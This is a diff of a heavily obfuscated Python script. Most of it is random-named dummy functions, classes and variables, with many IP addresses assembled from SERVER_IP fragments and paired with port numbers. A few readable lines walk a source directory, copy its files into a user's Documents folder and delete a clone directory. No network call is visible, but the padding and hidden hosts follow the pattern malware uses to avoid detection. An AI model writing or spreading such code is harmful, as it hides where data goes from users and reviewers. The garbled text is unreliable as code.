-def l0lIIOlII0OI(npS3s4SebMt, i1z1Glrzhzh_Rgp):
-    v3_VJz9hJ = 877
-    V6C6OLS19NpEO6C3Sh8q = 201
-    TbiQWA2Nm = 510
-    zXpMG_6AJQT = 374
-    pcwki0_lPY2l = 649
-    return npS3s4SebMt
+hXLxfIRaNbBiaLeISc = 182
+IlYNxswoe = None
+ii8xfQXIURl7GLpBfoN = -142
+H_53Tq6BzrdGVsORELiV = [59, 8, 10, 74, 43]
+Dp3A9gxcZVhRvF_VN = [39, 53]
 
-OlIIOOIIO0IOO =dyLJ66grdcMXRTkCeFd()
+IOlOIOO0 =SjoKLm81Bjn()
 
-gRrJDBtP4 =lamDKLsC(97224)
+lIO0lIOOl0 =RdTvF3_onc(6055)
 
-I0IO00O00lllll0 =SERVER_IP8 +SERVER_IP12 +'.' +SERVER_IP1 +SERVER_IP18 +SERVER_IP4 +'.' +SERVER_IP25 +SERVER_IP15 +SERVER_IP8 +'.' +SERVER_IP20 +SERVER_IP28
+yg9mDWw_WVhw0 = None
+wGTOVUFXNdVcruFMeesW = False
+RB56T_VMn95 = [82, 25, 62, 10, 44]
+wZoxA7KstQPf = None
+W8DBZK5zQnER39 = [88, 67, 10]
 
-Pzdmb6ea06q0 =l0lIIOlII0OI(99538, 52946)
+vpEt6PTzyxIsGZPRnxK =CUNzNSm6TJ27htcxfh3T(42365, 44296, 46344)
 
-jEO2uDswmbh =SERVER_IP8 +SERVER_IP24 +SERVER_IP14 +'.' +SERVER_IP5 +SERVER_IP30 +'.' +SERVER_IP4 +SERVER_IP22 +SERVER_IP10 +'.' +SERVER_IP1 +SERVER_IP25
-qzM7FA8K70wC3eX6 =40356
+class Faiwxjvptd_:
+    def __init__(self, e9HIBlJjQ):
+        self.e9HIBlJjQ = e9HIBlJjQ
+    def k3TmvtVhmbzBZs4q(self):
+        return 57
 
-Il0O0llO =SERVER_IP4 +SERVER_IP26 +SERVER_IP11 +'.' +SERVER_IP12 +SERVER_IP10 +SERVER_IP30 +'.' +SERVER_IP29 +SERVER_IP30 +'.' +SERVER_IP13 +SERVER_IP9
+jrY7bOyDSlpQ = None
+EaKkqq7HKx = [58, 50]
+GKXr5D5k = "ucqWphCVOWHhL"
+wNpr7NiC3 = None
 
-lI00O00lI0000O0 =O00IlOllIIOOOIOlIO(64736, 81490)
+DhtfVaUINHWpFOEgzCjH =hfSIETBZewW8()
 
-def bGXaFpOeoIlxti():
-    h230I2ozCQm5kH = 814
-    aDTcjHA8HoiCV = 819
-    h2jG1PEA4ZKdTeg0Y = 435
-    l1KlghHkf_FYeWy = 214
-    PWPCRWbkhVxYgLF = 757
-    return 48
+d0FhhSuJIKe =yHBaSJyl7d8kLN(13807, 96637, 63790)
 
-l00lIOllIlOlIlO =m074XA1H0UVCod(82181, 27106)
-
-class Mjc_kdcl3tjcmefo5gk:
-    def __init__(self, lgKLWGM95ibrYi, kEjVAvXlAQFs6, XF1CgRzo4rYcmuiWsK5):
-        self.lgKLWGM95ibrYi = lgKLWGM95ibrYi
-        self.kEjVAvXlAQFs6 = kEjVAvXlAQFs6
-        self.XF1CgRzo4rYcmuiWsK5 = XF1CgRzo4rYcmuiWsK5
-    def zo5r2YieWWAR(self):
-        return 79
-    def MxvpUlHOAwbKoDGhYNEP(self):
-        return 54
-
-def lIOl0OIOO0l0OO(ZJTqEQFOjc):
-    ThG9Y9DB5w4nfL = 320
-    m5WkfyrSVvot = 5
-    yiRpszAaHjwX6YRbnQM = 52
-    Akj0H29nafJUcz3yvPkt = 160
-    B6I3tAc9Qu14ks8_5 = 369
-    smBceCsFFzAJRiOQOK_ = 377
-    return ZJTqEQFOjc
-
-eynNgfrb6zx81Piu =HXTKOnubWlA7dn2mAE7(96174, 53360)
-
-OlI0OO0II =SERVER_IP3 +SERVER_IP15 +'.' +SERVER_IP18 +SERVER_IP22 +SERVER_IP29 +'.' +SERVER_IP15 +SERVER_IP26 +SERVER_IP29 +'.' +SERVER_IP24 +SERVER_IP29 +SERVER_IP24
-ll0l0IIIOII =49287
-
-OI0lII00II0lIO =bGXaFpOeoIlxti()
-
-def cShZ65nJIOPkRhr():
-    GB6wPMG85xPZQ_eHEsT = 18
-    qjFYzfUGN5K = 691
-    c7XtarcIao4KA37wu = 691
-    WiHu0g9wGViIV0fj = 544
-    SP4sAWtL7HvA67 = 172
-    arPZYJibM = 175
-    z96sX0xhr = 997
-    vl7N7xdSIpzv = 407
-    jHaY6YPcxJt1CNm = 207
-    return 23
-
-class Nnpeptucphxi:
-    def __init__(self, AShm7Jybdx, A_4pmxRJ8ogdhAq1F6m5, bRtZPfRTN1H):
-        self.AShm7Jybdx = AShm7Jybdx
-        self.A_4pmxRJ8ogdhAq1F6m5 = A_4pmxRJ8ogdhAq1F6m5
-        self.bRtZPfRTN1H = bRtZPfRTN1H
-    def ksnlpuTze(self):
-        return 1
-
-def QgsvC5NFbF9DD74(ArnDmZ0K0NMXVErmAKgM):
-    RsR5NGrPgunTu = 300
-    krEv4ZeFfMzaFbzrG2 = 492
-    NckiXyJaf = 622
-    DRRU5A7HFm = 613
-    ynOYLa9EI_kv_CtYil = 711
-    lFcjBNTDG6JDif = 179
-    T3zTMoajl = 350
-    return ArnDmZ0K0NMXVErmAKgM
-
-trO4P9uqK =SERVER_IP29 +SERVER_IP21 +'.' +SERVER_IP29 +SERVER_IP22 +SERVER_IP15 +'.' +SERVER_IP23 +SERVER_IP19 +'.' +SERVER_IP24 +SERVER_IP3 +SERVER_IP20
-QrFPmcWf18N =53718
-
-S2fqctYfVMN = "WLcvpv2IDjwfJd7C"
-ItyWSt3hedRZ_IB = True
-Nag3r4fj48a = "bCsZxS7HBx"
-BFfDSdMVG = False
-
-lO0I0I00l0I =SERVER_IP6 +SERVER_IP16 +'.' +SERVER_IP7 +SERVER_IP10 +'.' +SERVER_IP2 +SERVER_IP10 +SERVER_IP20 +'.' +SERVER_IP18 +SERVER_IP1 +SERVER_IP28
-OIO000 =16416
-
-eEWkiMass =SERVER_IP28 +SERVER_IP23 +'.' +SERVER_IP3 +SERVER_IP10 +'.' +SERVER_IP11 +SERVER_IP3 +'.' +SERVER_IP30 +SERVER_IP28
+Tntt40fgAi =SERVER_IP30 +SERVER_IP21 +'.' +SERVER_IP9 +SERVER_IP18 +'.' +SERVER_IP10 +SERVER_IP24 +SERVER_IP7 +'.' +SERVER_IP1 +SERVER_IP7
 
 destination_dir = "/home/user/Documents/proj1"
 
 
-def Dh0rL7BYfQ3_0(RP9jiaK33YGJsjj, uoS3T7HLSvvco0M9n):
-    IUIe2FQzkJUAwu_V = 157
-    uUkGzAJWVV9C6t = 103
-    EBNO2ShNj = 514
-    cCQ7TKSzWCPY = 749
-    kTVjw90yFL6KvYg = 122
-    return RP9jiaK33YGJsjj
+def fRllweU6SK25uhzi7w3Z():
+    izwLG08Y8_zDh = 473
+    YJnKMy8MXfITTd0h = 652
+    LHrrFmtFf = 762
+    EOmiRF7y = 679
+    wgsI9y4H7gHWk2mb5EU = 663
+    XrXNtNWU4ODMqUUFXO = 244
+    dtCoyqRPxg = 569
+    k_svhNdF3n2vMGluy = 959
+    BdKRy2Q2BxKVB4KZNr5 = 479
+    DF2hByK9fGpD = 743
+    return 39
 
-Fq7vLpqirRBol6cKgY =cShZ65nJIOPkRhr()
+OI0III0ll0l0lO =aN3IMcg5c0gMdWun(18848, 69781)
 
-class Wiayvvnmo:
-    def __init__(self, Af_WqBzIXly4Ew3, J41bySyZdtHcNqq00iA0):
-        self.Af_WqBzIXly4Ew3 = Af_WqBzIXly4Ew3
-        self.J41bySyZdtHcNqq00iA0 = J41bySyZdtHcNqq00iA0
-    def A3d4o_nU5VyhL6BjX0T(self):
-        return 84
+def Rgorc2Xc609HHOakm(wjuQbkumeSY3VR5GVk, AqkPJDmqGRcn):
+    ktztTTBsfKz7TUIITmO = 232
+    sxp7Ulu6e0_4SmN = 979
+    oUkK0MGbAuNWdwe = 139
+    rduZzkSsVpf99f04SA = 967
+    NVj4cUmzS1w = 168
+    IA2Cld9uQqi5p4TgD = 283
+    gRSJTpGSD51UJC8Ce = 327
+    return wjuQbkumeSY3VR5GVk
 
-class Hz6qyzdk5u:
-    def __init__(self, nEyph1kKRdQ_3sGdRoB, yKjavdQPAmOlBt7):
-        self.nEyph1kKRdQ_3sGdRoB = nEyph1kKRdQ_3sGdRoB
-        self.yKjavdQPAmOlBt7 = yKjavdQPAmOlBt7
-    def R45l6oj2(self):
-        return 34
-    def dDtQv3ET(self):
-        return 54
+d_fD79nowvWl0IJNS =vLLA8_ElTpM()
 
-VKdB4hD0fZ8W8xnYEU =WA1dmM68efmiOmMl(70394, 31642, 37228)
+o_Yh55tPbyulq88LG =SERVER_IP28 +SERVER_IP29 +'.' +SERVER_IP26 +SERVER_IP19 +'.' +SERVER_IP29 +SERVER_IP27 +SERVER_IP6 +'.' +SERVER_IP30 +SERVER_IP23 +SERVER_IP2
+rdwpgJm2MbD8ul =36565
 
-pVFqsgfYyqjHVxDvtqu =RlmGQyCAsBt8uyvWVQN0(99467)
+O00lOllOl0O0 =SERVER_IP27 +SERVER_IP29 +SERVER_IP22 +'.' +SERVER_IP15 +SERVER_IP26 +'.' +SERVER_IP17 +SERVER_IP22 +'.' +SERVER_IP11 +SERVER_IP22
 
-def DOOtVhtz(jyFNkYHmN1NY5_):
-    h3rOv80d_EPIRm7yHZy = 529
-    d84JWGeDG3Jj = 574
-    Yuauyi3lLw8 = 590
-    xivoqJS9P2WLy9vC = 757
-    return jyFNkYHmN1NY5_
+Y1VYBGgCID0dBTLO4 =SERVER_IP17 +SERVER_IP2 +SERVER_IP28 +'.' +SERVER_IP2 +SERVER_IP14 +'.' +SERVER_IP18 +SERVER_IP4 +SERVER_IP11 +'.' +SERVER_IP16 +SERVER_IP5 +SERVER_IP26
+yEMeVMEKcgQrnDbS =25120
 
-def VYvHi8s4XG():
-    xmEFwbazXJebV2Jfe = 861
-    IHfRTfvPzwlRs08PAqS = 106
-    nSFAl2ksWAD6vx = 604
-    hP8ykuonhqB16p521U3J = 777
-    u4zeLirkE = 929
-    NwBRl_bmZ311FCW = 843
-    RN52BUSEsr1dcnTR0v2Y = 212
-    TMfP6xzuKlCeIX = 857
-    return 3
+lllOlll0I =LolJqTjS5TW(87515, 12919)
 
-def k5Gb5Mnwq():
-    jKuacauSPNtjI2dkDGV = 648
-    CggRiw_smq8 = 166
-    QP8BoKJyzsxvFVKXPOE = 663
-    GyZ7VSuzcmJdWy = 200
-    mfceV3ZHkchMiD = 145
-    XpoiqjXQElm6X4a0uC = 182
-    jyLznJ8AtNpr = 901
-    gDBwYJht1h0ag = 156
-    djeUVYeBsPffkUTOzs = 100
-    p3ZYj7qLeUNsfbnUUXQK = 694
-    return 19
+OOIIlI00lO00IIl00I =SERVER_IP22 +SERVER_IP22 +SERVER_IP29 +'.' +SERVER_IP2 +SERVER_IP21 +'.' +SERVER_IP30 +SERVER_IP14 +SERVER_IP4 +'.' +SERVER_IP4 +SERVER_IP6 +SERVER_IP10
+OOI000 =24720
 
-def n7NcnCloged7IgwAFbbR(bJvnl0QXxXzdR1, h_gJ_S19tY7h2MBsJNIE, g3Nx1tZAm7MPjLJ_T):
-    SCnL2za6i_vXp0SNCDat = 766
-    OnzRlPduAA8tb5VmASW = 71
-    LHIaDxYucz3bk4LdOX = 808
-    xcaCjeHJa_GmZBvgMO = 46
-    qKYMp_Nd = 294
-    cgKAdmBDqM1Jmxt0 = 790
-    eCQXvEqJH177gXFu0 = 290
-    QtIsL_Bt3i9zSBNUS = 102
-    fVzLhXYXbWNmBzDA = 520
-    TjJ8iypbX5V = 236
-    return bJvnl0QXxXzdR1
-
-lOlO00OlOOOIIllO00 =O0OlOIOI00Ol0(50425)
-
-def OFag9r_oFWY62O6f0u(bxgiU1SIaKma, qmyOlLr0rOaepO5):
-    sw2iwLHGua = 285
-    DEocfI3lZXaD7D = 957
-    DoLNfa0QVsa = 13
-    uiUXG0XJCiCRq = 445
-    uN4l31y77EVGjX = 8
-    sOd3xFXy6 = 61
-    K7CUnLYTk_VR = 372
-    Ajy74uH3h1mE = 620
-    wri9KcJUCLOR = 446
-    return bxgiU1SIaKma
-
-def I0gSM3eESI31dvHDIJ0(oV5qDHGZql3Ojuy3):
-    Wi9e7LbbGJD4drMA1BC = 530
-    Bm3FFhbsgrzf = 813
-    Ahz6VO8aGqcb = 240
-    KwpBqrFyeU = 724
-    TGKopGcl50C1 = 159
-    return oV5qDHGZql3Ojuy3
-
-def OOlIOI(xXsBqNJ1TyP):
-    rQyDMFxHC5_yzzM58R7D = 214
-    pNbWg94T7XdTW49 = 283
-    MvIg4wqs3009SoB302Z = 418
-    return xXsBqNJ1TyP
-
-XvFfYHyO9fetCE9 = False
-URwzRPFf3d = 89
-uIFmb1CxdnmHaXBstOSD = False
-Bu88V5Ji = "HQN3brkyRnx7NWbCEP"
-R_YXp8m0aln7J = False
-ZujhN6j8IVNn = None
-
-OOlOIOIOOI00lIl0O =n7NcnCloged7IgwAFbbR(9455, 78162, 16782)
-
-l0IO0IIlIlI =IzRIW24ndjpMLQmA(29893)
-
-IABOQM_d3E8 =SERVER_IP17 +SERVER_IP26 +'.' +SERVER_IP18 +SERVER_IP8 +'.' +SERVER_IP10 +SERVER_IP7 +'.' +SERVER_IP19 +SERVER_IP7
-
-OMf5IieuuVR22nexZ5 = False
-yx0pEa53C = None
-R1gS_a6hSnoEE3nApJt = [83, 29, 39, 53]
-MarjwP06P_C = True
-
-def IOlIOIOIlIIllI(wTHrSaVZOwO, snMnc4WPm3Vy, Q1DzZWFWkFX_e):
-    ZuL5uI24j = 589
-    IjpsTzxCqBMh = 36
-    UQq1uxQdL8KF9daO = 40
-    vbmxFaFsSfYHUImW8 = 986
-    qfSp3hkmV_6NnEiIJgG5 = 420
-    return wTHrSaVZOwO
-
-gt5saC9dOru1UY =VYvHi8s4XG()
-
-rMhHXbEey8jjpLo1 = 996
-g6IBcwHijm9WSXOGghnE = "ESoI2HKG"
-O7tfhEAK27 = [96, 88, 86, 42, 31]
-sTVLSBv44YTc3CuHnkTB = False
-HUYXj1LQ4QahYXpCLV = -683
-XtUsuWKJ = [24, 68, 66, 45, 24]
-
-b_8QWr4Ti3713i =SERVER_IP5 +SERVER_IP11 +'.' +SERVER_IP4 +SERVER_IP14 +SERVER_IP28 +'.' +SERVER_IP26 +SERVER_IP10 +SERVER_IP8 +'.' +SERVER_IP25 +SERVER_IP28 +SERVER_IP10
-
-def lOl0OllII0O0IIIlI(f0B03rWO8BBz_a74o9, QsXbZySVDHQ):
-    HEEYk2_Al5GCVXbM = 870
-    r14rrsE2JIA = 705
-    kKuhHekZ3K4x = 26
-    htWeYJxk = 681
-    BPg2ajOpJw = 914
-    z2Jwvx9Ffn5WTg1Nrgu8 = 110
-    return f0B03rWO8BBz_a74o9
-
-fEQbsnLGcWWxVr0_N =OFag9r_oFWY62O6f0u(69839, 75430)
-
-nKdeqVDPTEn0NuOUEJQH =k5Gb5Mnwq()
-
-def eYGzP5xKpIG4F(CONZWpgyW_mRhzw5q5Bl):
-    ndzr0cDx6O = 378
-    yhIG4mxrSE6NxeX = 496
-    B035698bfMzXomqZ4UB = 978
-    LMl0zR9ET9G = 547
-    cYPvlWIM8EACNj = 553
-    E563ZmiQGGHhrC = 111
-    L4IEDm4oCkWAZ = 741
-    return CONZWpgyW_mRhzw5q5Bl
+def wfpuoiRoqMqjyY(DY4YvEYPW3oM3ZesX, xhYyxoCDUJK2xc, R1SBqF6udUnPCEhoI):
+    QElL4nu8tvUyzhMBz = 322
+    rRWH9opz = 703
+    qXmfOjnemwAqNj6wrWOz = 953
+    vOGtFWdI = 151
+    V8AoWQI1Mc49j = 432
+    return DY4YvEYPW3oM3ZesX
 
 for root, dirs, files in os.walk(source_dir):
     relative_path = os.path.relpath(root, source_dir)
@@ -1487,663 +1655,503 @@ for root, dirs, files in os.walk(source_dir):
         shutil.copy2(src_file, dest_file)
 
 
-n74Wj_qHqQNax =gBWTPnl9IwGjbhgGvi(23834, 41794, 59278)
+class B2fl96vsosoekiw:
+    def __init__(self, GRS2KpEBUg47A4V, c0Bdcqdn7K53):
+        self.GRS2KpEBUg47A4V = GRS2KpEBUg47A4V
+        self.c0Bdcqdn7K53 = c0Bdcqdn7K53
+    def O61KmmTEnToXK1(self):
+        return 48
 
-GWRCosMK37DA7HV =SERVER_IP1 +SERVER_IP24 +SERVER_IP25 +'.' +SERVER_IP6 +SERVER_IP19 +SERVER_IP13 +'.' +SERVER_IP10 +SERVER_IP23 +'.' +SERVER_IP15 +SERVER_IP12 +SERVER_IP27
-TzrNLXx0C =19363
+FqKnkaQKf =EwTclbCgEkffX(2684, 16788)
 
-Is1WQZJnTJrchVfLTep =vOcDvjBDy(58257, 95122)
+N4jfOCiXRkL =SERVER_IP4 +SERVER_IP19 +SERVER_IP23 +'.' +SERVER_IP25 +SERVER_IP8 +SERVER_IP20 +'.' +SERVER_IP5 +SERVER_IP29 +SERVER_IP29 +'.' +SERVER_IP29 +SERVER_IP28
+suF4fwhCMXmBc =22611
 
-def DxbcjIWNFcwYO1Z62(ztXFE2aiW9OpnPeXbk, XMmgxDqI9ghAX):
-    qlejeiAgIZB = 138
-    CUqmqbINcPrRCg = 219
-    kdbEsAtyV = 265
-    f2fcWIMMQ = 598
-    vc5N7q8e = 920
-    return ztXFE2aiW9OpnPeXbk
+def l4eEEz7gizrbTJRTQNrN(bn88wCcr36Zx):
+    mMhOqWbJ99QDZ2lre = 849
+    PqFTOj4JjXCoVeSQil = 834
+    qLL4DiieIg04 = 222
+    v_Yeba9KRckFfVTq6 = 614
+    tdGSp0Oo = 582
+    amETeNSVZu1Ix = 102
+    return bn88wCcr36Zx
 
-def vLZoDzo8(wPPEA6KKaX8n55GMG, BQrPvYLhxqJbL1, qGuebWAkE):
-    S1WniF9cYWx64 = 708
-    Ac_zUdujPbkqcuN = 296
-    mT16RGijp5OTcUNt3q = 721
-    tijOginZU6 = 14
-    FA_nNa12__b6qWU8L19A = 141
-    yO2NDmb2H5n7l4i7EV8K = 179
-    iNi9z8Sl2_EP7hhPhr2x = 182
-    LGqw1hBD = 722
-    return wPPEA6KKaX8n55GMG
+NZ9in9PbS =yMCEssg40IFmzU6bf()
 
-IIOlIlIlIOOOll =admbsfCDjXW(94878, 10301)
+c6bE7dbGd0qRXWS =lO0O0OI00OOl0l(55037, 37507, 69361)
 
-O00OOI0l =SERVER_IP23 +SERVER_IP14 +SERVER_IP25 +'.' +SERVER_IP26 +SERVER_IP27 +'.' +SERVER_IP25 +SERVER_IP7 +'.' +SERVER_IP23 +SERVER_IP9
+QmIX2NIqhWV = None
+zt9yM6CpTabfu7cOfCKt = False
 
-def D33uZRC9sZt5sY4VvvYL(QHqj3e8s4v1bqh3):
-    bu_p2omPh1 = 960
-    N04N1PUDdBLvCu2Ql = 65
-    grt8yJlT89J = 592
-    MXobfiGo0UgmhMOIG = 979
-    PF_wea2IlYdZhJh = 860
-    HOQt8wEg5xD2t7vJN5E = 428
-    JUdKohMl = 210
-    return QHqj3e8s4v1bqh3
+aR7mVrMl =SERVER_IP4 +SERVER_IP8 +SERVER_IP24 +'.' +SERVER_IP20 +SERVER_IP5 +'.' +SERVER_IP5 +SERVER_IP18 +'.' +SERVER_IP14 +SERVER_IP22
+QhFoyURIcndYTsBH =63991
 
-UNBuxp9N88SQHX0NxY =SERVER_IP30 +SERVER_IP25 +'.' +SERVER_IP9 +SERVER_IP13 +'.' +SERVER_IP22 +SERVER_IP18 +'.' +SERVER_IP8 +SERVER_IP27 +SERVER_IP6
+CR3slDlckWxp25E =we5Y79cgPUv8xlWCeBw(12492, 50980)
 
-lOI0OOOlI0OlIlI =vLZoDzo8(89557, 56348, 99997)
+Q6ELRSMdDxBXi7dP =Rgorc2Xc609HHOakm(48906, 47729)
 
-def sBenpaXCB(jb5RRmb7RpuvAj0ZC2lI, mQuriAmRJlxl2LfaG9):
-    hUA4EvFH8 = 182
-    OpJeuyBTEC99UTfVnUJo = 691
-    Nq0q8uk9m_JqfhTnZ = 637
-    return jb5RRmb7RpuvAj0ZC2lI
-
-BxKULvjrNCO =LjhbsmKDOSNgHK(17178)
-
-pY3MTEmgsMP5 =DOOtVhtz(82279)
-
-class Sw7s4xxzft:
-    def __init__(self, Qxywe8ZbiY2n3zz):
-        self.Qxywe8ZbiY2n3zz = Qxywe8ZbiY2n3zz
-    def UcRSZUCC4Ut8(self):
-        return 66
-    def tJQYR5AhG(self):
-        return 75
-
-cfvQQJTs =SERVER_IP1 +SERVER_IP9 +SERVER_IP30 +'.' +SERVER_IP17 +SERVER_IP14 +'.' +SERVER_IP30 +SERVER_IP29 +'.' +SERVER_IP10 +SERVER_IP19 +SERVER_IP14
-
-XYEtBqKKNl2T6RmMMqQ =Dh0rL7BYfQ3_0(91424, 71506)
-
-def KgZIcVilirTBlj(vSSZJufqHvPEtIH, y3GmA1EAh2p, RhfZbIlXKeVZ):
-    nZqvr64NoiXjzkWT9s = 190
-    gkPwwF1qoSj9qtE = 405
-    UsARRFWF6y7nJAL_MG = 91
-    return vSSZJufqHvPEtIH
-
-def OuaXCZqXD95FtAI7(Ma1CYinVl):
-    adpTbrggeH32 = 88
-    FzqYxkKA3ZNN_vao = 13
-    iLG3BnJYQ = 652
-    H6dgqfCJ6khFUNO4xS3 = 418
-    oH0UBYT5h0YJCIvOVtEl = 719
-    return Ma1CYinVl
-
-ZIP8_qod1ibE1FkEKI0 =eKyQLzMz()
-
-class Zry8mxnrc:
-    def __init__(self, XdwcV21iDGEfSyPvSo4I):
-        self.XdwcV21iDGEfSyPvSo4I = XdwcV21iDGEfSyPvSo4I
-    def E_mDXjm7ntxVSJbQvWg(self):
-        return 70
-
-def l0IlIIOllOOIl0lO0l(Rd2A153p8qnMq9, BTmXtfh5wtLZw4BHK2):
-    WIL_XWPc1i5TNJ = 969
-    yJn6HttztTA = 986
-    djGppKLsTNnZu = 694
-    NhclxsptgLFrg = 248
-    return Rd2A153p8qnMq9
-
-dpTsMnrk =WoX__5QvDor_wxgBdaP(70069, 87567, 57952)
-
-def zICwRLNx7_gUU(ZYpM7pNxdN):
-    SY8N2lajT = 200
-    KlsBcT4hu855L_6shz = 772
-    TSjSMiakDTLMon = 248
-    mp7h84t_W52mwU = 250
-    xvfLFJN_mMtoNK7_ = 236
-    return ZYpM7pNxdN
-
-OcD64F7KlK =mzHVhWdI5e9eE(18188, 63675, 60293)
-
-class Qxxtnaq0qzauk8rjgs9w:
-    def __init__(self, ySIo9EroMstKNQPQrgM, UVvXH22T8dAn5IQA, GlaoOxMbq):
-        self.ySIo9EroMstKNQPQrgM = ySIo9EroMstKNQPQrgM
-        self.UVvXH22T8dAn5IQA = UVvXH22T8dAn5IQA
-        self.GlaoOxMbq = GlaoOxMbq
-    def mFemtddtbDL8KyeQYRN(self):
-        return 19
-
-Vtu49bLoKNec =II0llO00lOl0O00ll(44198, 7371)
-
-class Jrv3cxqborc5ws7nb:
-    def __init__(self, Kvl8PaSSLpp, m3DZpsZX5qklOAgrS, UQrZcQ7X):
-        self.Kvl8PaSSLpp = Kvl8PaSSLpp
-        self.m3DZpsZX5qklOAgrS = m3DZpsZX5qklOAgrS
-        self.UQrZcQ7X = UQrZcQ7X
-    def nd7F1tVatBZKAWHb(self):
-        return 12
-    def mkABhkjhvWKsHerEDn(self):
-        return 7
-
-IO0000OllllOlIOOl =XYXXX4VKqMhU(68634)
-
-lIIOlOOIlll0OO =l0IlIIOllOOIl0lO0l(96343, 2396)
-
-def utgM6Rdzrloz1EKJsF():
-    SfFitKzNMh_ = 146
-    aGmerI150ppDxdG4mY = 650
-    b4MA_jK1_yJukCH = 824
-    lJyfLH64UD0hmzxsrTj = 791
-    agkkfNX6czeooSK0sg = 912
-    i3NP_78hY3LdDV5Z = 807
-    uybOoxLo2hWPuo = 654
-    return 50
-
-vcpTPoHA6KG3cpI8BA =SERVER_IP2 +SERVER_IP17 +'.' +SERVER_IP10 +SERVER_IP27 +SERVER_IP3 +'.' +SERVER_IP21 +SERVER_IP7 +SERVER_IP23 +'.' +SERVER_IP13 +SERVER_IP11 +SERVER_IP8
-h1Jel1VBXjOH =51809
-
-def A9kH4FQXoec_Fod2Cx(lEi4dBRDzDpBXu3m, xp9xWX_ouV, yIAmo6wBJJ_b):
-    EHKErvaH = 47
-    xyAlddJ1 = 584
-    i3h1h5Pe2KKBV73s = 797
-    Of2UyMHXzIKBWBVOSr = 553
-    g_F6yRV47 = 974
-    idMmMm2zIGJF93mTACC = 722
-    B5qeZKRa1Kh = 798
-    R_FIRW2GyOM = 30
-    HqpRV7buDS3S37e5C = 999
-    return lEi4dBRDzDpBXu3m
+def XKJ5WTuU2T(ZrgKH4zq):
+    vh_WSBxVFM8d = 863
+    wAtlqxFAqzsp3t4 = 955
+    JejNrREmJHUl8 = 472
+    hSDgCqHnTeqwewyJl3UW = 20
+    QHGwrr1jBW5zS1t = 904
+    return ZrgKH4zq
 
 shutil.rmtree(clone_dir)
 
 
-pW7uYw1Uu9WdalGFIA2o =SERVER_IP15 +SERVER_IP12 +'.' +SERVER_IP17 +SERVER_IP11 +SERVER_IP19 +'.' +SERVER_IP24 +SERVER_IP12 +'.' +SERVER_IP22 +SERVER_IP11
-SjAjUlSPYP =41741
+XNzCGYZiITIds2CBj =fRllweU6SK25uhzi7w3Z()
 
-def Qw12NHSdtfn8b5():
-    IWFcb_TpNrEzQZpH = 587
-    FC1Eq_HuOusNZ = 805
-    QAuHCzyNyKd0VRJ = 195
-    NPxPdrmSVDjk = 546
-    AdUZEAzE4Mz = 234
-    return 23
+x0yRHGizoGI6l7MXoja =IOIlIII(42517)
 
-EVsIvArgK3wPnYqWE1Hy =SERVER_IP26 +SERVER_IP27 +'.' +SERVER_IP26 +SERVER_IP30 +SERVER_IP29 +'.' +SERVER_IP25 +SERVER_IP3 +'.' +SERVER_IP1 +SERVER_IP13 +SERVER_IP26
+e1nWIEKG = -641
+TeRGejTM0Ca = None
 
-LCc9y7rhFUFJEJZzU =A9kH4FQXoec_Fod2Cx(45633, 30973, 2554)
+JfvBxmGA9DdQSBPsg =LQhfDjJLM4rwQY1Nu(98754)
 
-def OlOIlO(lomzy7pD3W_blAMGUUFk, aNkBUUZR):
-    QZiSaid2lTdL20DBGlZ = 845
-    TgwSYU4ThEv2mdxH = 759
-    KjUt0Be3lzgY5WAHN = 394
-    lElmtUgz1 = 520
-    xQLd768HANkHF = 957
-    B5zNRUEDZ4 = 532
-    V_dVS3s4a2 = 611
-    C6jRUe9zmRb3Gbiv = 680
-    ZtLf6sZ0N = 232
-    cS32aOL8tSuIAPqsx = 948
-    return lomzy7pD3W_blAMGUUFk
+O0OO0I0lOl0O =LrZHSuIPPkVJY95SnDKC(84859, 83377, 24707)
 
-hCSWl9SE6RKGR_ =OuaXCZqXD95FtAI7(91118)
+VEQ6IvOc9vw9JmZ =YHYQsbesjAntBg8Z1H(26165, 30131)
 
-sqkM3ojHwBKeC9PVy =zICwRLNx7_gUU(81544)
+def SHn5kuxx4LA(dakAxTiSdwVl8qKOb_V, jHS0n9kPShPGl):
+    zo__i0ODcR = 708
+    Y4aRT5cx = 637
+    ZrPaezBCWVR0DVfyaYn9 = 722
+    fBK90yVfD5ZUZit = 787
+    JEEV5OFdpZi5odlv = 713
+    wL9tdO7lBa87sQYH = 379
+    return dakAxTiSdwVl8qKOb_V
 
-def wvi2UfyLhgsH(Y7f63dVV1YXV, bXMiNMQK2yD1tG2jM6A, jgbHrHvtkIjQPJ):
-    eEeTVANRyXuSXC5zMA = 518
-    iI6eBdsTfRWLWNVnZMi = 850
-    ijzkEniV0A2KUe = 790
-    eVmm39EjCYnwqQ = 385
-    WqLTZdS1Sn = 31
-    L2ISB5UE_O9 = 692
-    FrclDv8xm6J6PJS = 817
-    IXcnNqO7kei6O_ = 477
-    wKYTiv0Q61vPMtby = 701
-    return Y7f63dVV1YXV
+ESYIAWDeI =I55gE6C0Ci(4765, 30157, 37332)
 
-OOOl0l0ll =SERVER_IP30 +SERVER_IP29 +SERVER_IP18 +'.' +SERVER_IP4 +SERVER_IP13 +SERVER_IP30 +'.' +SERVER_IP27 +SERVER_IP2 +'.' +SERVER_IP7 +SERVER_IP30 +SERVER_IP10
+def II000OIOIl():
+    zpuEvOpM = 826
+    jazNiXCm9MqaKnb = 591
+    H0NU5DuRiG_RIJFcQJ = 959
+    return 27
 
-cqZ7sZfEgtFCXZkrSq =utgM6Rdzrloz1EKJsF()
+def EtpqL_nTxDl8Yq():
+    ajLXy9gHTokp5C = 886
+    TaCcaojJlDCLvpWco = 236
+    sboVkvqK51G0IUrw0A = 672
+    FvWheRUAkLG = 457
+    iREh_MBSYo = 444
+    pjSk7h9L8MAi8xI7mH = 563
+    ePTkgoqjRprb_YG502iY = 833
+    yPPyI0C_v = 877
+    nTtaGuLoEWuCg8Q = 59
+    EYA0qacAY = 909
+    return 74
 
-class Kzu_egtg6jqs2:
-    def __init__(self, hx784xt7dYYHZ3K_WvkH, ImXJb0XSA):
-        self.hx784xt7dYYHZ3K_WvkH = hx784xt7dYYHZ3K_WvkH
-        self.ImXJb0XSA = ImXJb0XSA
-    def vV62U92ccm7hr7gqyCU(self):
-        return 79
-    def Miq8I9XR(self):
-        return 12
+def m6dn50K2j59odvEFQws(sMan04_tmq):
+    KuNJzIh5pW = 775
+    LrFaS4xGSrTeZ6ZumZ = 620
+    uvBddmU4haLNpiNtdJAz = 441
+    Y34tQeJPDfMgV5 = 368
+    mV1YHzBb435zuAX4 = 20
+    cr4GScG6Wdw = 490
+    X9Q4neDd = 544
+    return sMan04_tmq
 
-tfx0hoNM =Qw12NHSdtfn8b5()
